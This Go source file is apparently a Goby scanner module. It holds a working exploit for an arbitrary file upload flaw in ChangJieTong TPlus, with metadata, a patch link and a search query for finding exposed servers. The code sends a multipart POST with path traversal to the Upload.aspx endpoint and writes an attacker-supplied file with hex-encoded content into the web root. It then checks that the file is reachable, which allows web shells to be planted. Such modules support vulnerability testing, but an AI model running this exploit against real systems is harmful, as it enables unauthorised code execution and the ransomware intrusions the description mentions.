package exploits

import (
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ChangJieTong TPlus Upload.aspx Arbitrary file upload vulnerability leads to arbitrary code execution",
    "Description": "<p>Changjietong TPlus is a smart, intelligent and fashionable Internet management software. It is mainly aimed at the financial business integration application of small and medium-sized industrial and trade enterprises, and integrates elements such as socialization, mobility, Internet of things, e-commerce and Internet information subscription. Changjietong T + is applicable to the management needs of different organizations and institutions for enterprise financial summary; Fully support the management needs of enterprises for remote warehouses and remote offices; Fully meet the needs of enterprise financial and business integration management.</p><p>Changjietong TPlus  has a remote code execution vulnerability. In a specific configuration environment, a remote unauthenticated attacker can upload malicious files on the interface through specific parameters to execute arbitrary commands. At present, this vulnerability has been exploited by attackers to carry out blackmail software attacks.</p>",
    "Impact": "ChangJieTong TPlus Upload.aspx Arbitrary file upload vulnerability leads to arbitrary code execution",
    "Recommendation": "<p>At present, the official has released a patch for this vulnerability. Users can refer to the following link for timely updates.</p><p>https://www.chanjetvip.com/product/goods/goods-detail?id=53aaa40295d458e44f5d3ce5</p>",
    "Product": "ChangJieTong-TPlus",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "畅捷通 T+ Upload.aspx 任意文件上传漏洞导致任意代码执行",
            "Description": "<p>畅捷通“T+”是一款灵动、智慧、时尚的互联网管理软件，主要针对中小型工贸和商贸企业的财务业务一体化应用，融入了社交化、移动化、物联网、电子商务、互联网信息订阅等元素。畅捷通 T+适用于异地多组织、多机构对企业财务 汇总的管理需求;全面支持企业对远程仓库、异地办事处的管理需求;全面满足企业财务业务一体化管理需求。&nbsp;</p><p>畅捷通 T+ 存在远程代码执行漏洞，在特定配置环境下，远程未经身份认证的攻击者可通过特定的参数在接口上传恶意文件从而执行任意命令。目前，此漏洞已被攻击者利用来进行勒索软件攻击。<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">畅捷通 T+ 远程代码执行漏洞，在特定配置环境下，远程未经身份认证的攻击者可通过特定的参数在接口上传恶意文件从而执行任意命令。目前，此漏洞已被攻击者利用来进行勒索软件攻击。</span><br></p>",
            "Recommendation": "<p>目前，官方已发布针对此漏洞的补丁程序，用户可参考以下链接及时更新。<br></p><p>补丁：<a href=\"https://www.chanjetvip.com/product/goods/goods-detail?id=53aaa40295d458e44f5d3ce5\" target=\"_blank\">https://www.chanjetvip.com/product/goods/goods-detail?id=53aaa40295d458e44f5d3ce5</a></p>",
            "Product": "畅捷通-TPlus",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "ChangJieTong TPlus Upload.aspx Arbitrary file upload vulnerability leads to arbitrary code execution",
            "Description": "<p>Changjietong TPlus is a smart, intelligent and fashionable Internet management software. It is mainly aimed at the financial business integration application of small and medium-sized industrial and trade enterprises, and integrates elements such as socialization, mobility, Internet of things, e-commerce and Internet information subscription. Changjietong T + is applicable to the management needs of different organizations and institutions for enterprise financial summary; Fully support the management needs of enterprises for remote warehouses and remote offices; Fully meet the needs of enterprise financial and business integration management.<br></p><p>Changjietong&nbsp;<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">TPlus</span> &nbsp;has a remote code execution vulnerability. In a specific configuration environment, a remote unauthenticated attacker can upload malicious files on the interface through specific parameters to execute arbitrary commands. At present, this vulnerability has been exploited by attackers to carry out blackmail software attacks.<br></p>",
            "Impact": "ChangJieTong TPlus Upload.aspx Arbitrary file upload vulnerability leads to arbitrary code execution",
            "Recommendation": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">At present, the official has released a patch for this vulnerability. Users can refer to the following link for timely updates.</span><br></p><p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\"><a href=\"https://www.chanjetvip.com/product/goods/goods-detail?id=53aaa40295d458e44f5d3ce5\" target=\"_blank\">https://www.chanjetvip.com/product/goods/goods-detail?id=53aaa40295d458e44f5d3ce5</a><br></span></p>",
            "Product": "ChangJieTong-TPlus",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "body=\"><script>location='/tplus/';</script></body>\"",
    "GobyQuery": "body=\"><script>location='/tplus/';</script></body>\"",
    "Author": "su18",
    "Homepage": "https://www.chanjetvip.com/",
    "DisclosureDate": "2022-08-30",
    "References": [
        "https://www.chanjetvip.com/a/1053502"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "a.txt",
            "show": "默认上传系统根目录"
        },
        {
            "name": "fileContentHex",
            "type": "input",
            "value": "313233 ",
            "show": "Hex编码"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10669"
}`

	exploitChangjet12o3131 := func(fileName string, fileContent string, host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewPostRequestConfig("/tplus/SM/SetupAccount/Upload.aspx?preload=1")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-type", "multipart/form-data; boundary=--------------------Hutool_974onfqddru1yme6")
		requestConfig.Data = "----------------------Hutool_974onfqddru1yme6\r\nContent-Disposition: form-data; name=\"File1\";filename=\"" + fileName + "\"\r\nContent-Type: image/jpeg\r\n\r\n" + fileContent + "\r\n----------------------Hutool_974onfqddru1yme6--"
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "submitPic()") {
				return true
			}
		}
		return false
	}
	checkUploadedFile1231391387 := func(fileName string, fileContent string, host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewGetRequestConfig("/tplus/" + fileName)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Timeout = 15
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, fileContent)
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rand1 := goutils.RandomHexString(4) + ".jpg"
			rand2 := goutils.RandomHexString(4)
			if exploitChangjet12o3131("../../../"+rand1, rand2, u) {
				return checkUploadedFile1231391387(rand1, rand2, u)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			fileName := ss.Params["filePath"].(string)
			fileContent := ss.Params["fileContentHex"].(string)
			content, _ := hex.DecodeString(fileContent)
			if exploitChangjet12o3131("../../../"+fileName, string(content), expResult.HostInfo) {
				expResult.Success = true
				expResult.Output = "恶意文件上传成功，访问路径：/tplus/" + fileName
			}
			return expResult
		},
	))
}
